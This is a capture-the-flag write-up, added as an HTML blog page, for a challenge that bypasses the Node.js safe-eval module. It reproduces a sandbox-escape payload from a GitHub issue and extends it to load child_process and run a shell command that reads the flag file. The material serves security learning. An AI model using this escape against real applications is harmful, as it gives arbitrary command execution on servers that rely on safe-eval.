@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- 21 Dec. 2022 -->
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Advent of CTF - Challenge 19</title>
+<meta name="author" content="Arjen Wiersma" />
+<meta name="generator" content="Org Mode" />
+<meta description='Writings by Arjen'/>
+<link rel='alternate' type='application+rss/xml' title='Writings by Arjen' href='/posts/rss.xml'/>
+<link rel="stylesheet" href="../../../css/theme.css?v=20216e086cf8a20ead56908f3be0bcda6af2531ec1a68c9058ee7495590f57ea" type="text/css">
+</head>
+<body>
+<main id="content" class="content">
+<header>
+<h1 class="title">Advent of CTF - Challenge 19</h1>
+<p class="subtitle" role="doc-subtitle">&ldquo;Safe?&rdquo;</p>
+</header><nav id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#org9203b09">Challenge</a></li>
+<li><a href="#org5ddd71d">Solution</a></li>
+</ul>
+</div>
+</nav>
+
+<section id="outline-container-org9203b09" class="outline-2">
+<h2 id="org9203b09">Challenge</h2>
+<div class="outline-text-2" id="text-org9203b09">
+<p>
+This challenge builds on the previous one. The elves upgraded the application with a module to make it safe again.
+</p>
+
+<p>
+What you will learn:
+</p>
+
+<ul class="org-ul">
+<li>Bypassing the <code>safe-eval</code> module</li>
+</ul>
+</div>
+</section>
+
+<section id="outline-container-org5ddd71d" class="outline-2">
+<h2 id="org5ddd71d">Solution</h2>
+<div class="outline-text-2" id="text-org5ddd71d">
+<p>
+The introduction of this challenge is in <a href="./../challenge-18/index.html">./../challenge-18/index.html</a>. It starts the same, but you will notice that you can not call any function or standard Javascript objects. Entering any <i>wrong</i> data will give an error message, clearly showing the use of the <code>safe-eval</code> module. 
+</p>
+
+
+<figure id="org73212fb">
+<img src="index_att/identify-safe-eval.png" alt="identify-safe-eval.png">
+
+<figcaption><span class="figure-number">Figure 1: </span>Identify safe-eval</figcaption>
+</figure>
+
+<p>
+Looking at the <a href="https://github.com/hacksparrow/safe-eval">Github</a> page for the project you might notice a currently <b>open</b> <a href="https://github.com/hacksparrow/safe-eval/issues/16#issuecomment-554301596">issue</a> that states that the safe-eval can still be escaped.
+</p>
+
+
+<figure id="org27d3d31">
+<img src="index_att/github-20201220.png" alt="github-20201220.png">
+
+</figure>
+
+<p>
+The issue describes a payload that can be used to &ldquo;exploit&rdquo; the issue. In this case it will only return a process, but not do anything yet.
+</p>
+
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 1: </span>The payload from the issue</label><pre class="src src-javascript">(
+    <span class="org-keyword">delete</span>(<span class="org-constant">this</span>.constructor.constructor),<span class="org-keyword">delete</span>(<span class="org-constant">this</span>.constructor),
+    <span class="org-constant">this</span>.constructor.constructor(<span class="org-string">"return process"</span>)()
+)
+</pre>
+</div>
+
+<p>
+Building on it and with some NodeJS payload knowledge/research a new payload can be constructed. 
+</p>
+
+<div class="org-src-container">
+<label class="org-src-name"><span class="listing-number">Listing 2: </span>Building on the payload</label><pre class="src src-javascript">(
+    <span class="org-keyword">delete</span>(<span class="org-constant">this</span>.constructor.constructor),
+    <span class="org-keyword">delete</span>(<span class="org-constant">this</span>.constructor), 
+    <span class="org-constant">this</span>.constructor.constructor(<span class="org-string">'return process'</span>)()
+        .mainModule.require(<span class="org-string">'child_process'</span>)
+        .execSync(<span class="org-string">'cat flag.txt'</span>).toString()
+)
+</pre>
+</div>
+
+<p>
+When you have your points, don&rsquo;t forget to grab the badge!
+</p>
+
+
+<figure id="orgf2b0e80">
+<img src="./index_att/badge.png" alt="badge.png">
+
+</figure>
+
+<p>
+Go back to the <a href="../../../index.html">homepage</a>.
+</p>
+</div>
+</section>
+</main>
+<footer id="postamble" class="status">
+<p class="author">Author: Arjen Wiersma</p>
+<p class="date">Created: 21 Dec. 2022</p>
+</footer>
+</body>
+</html>
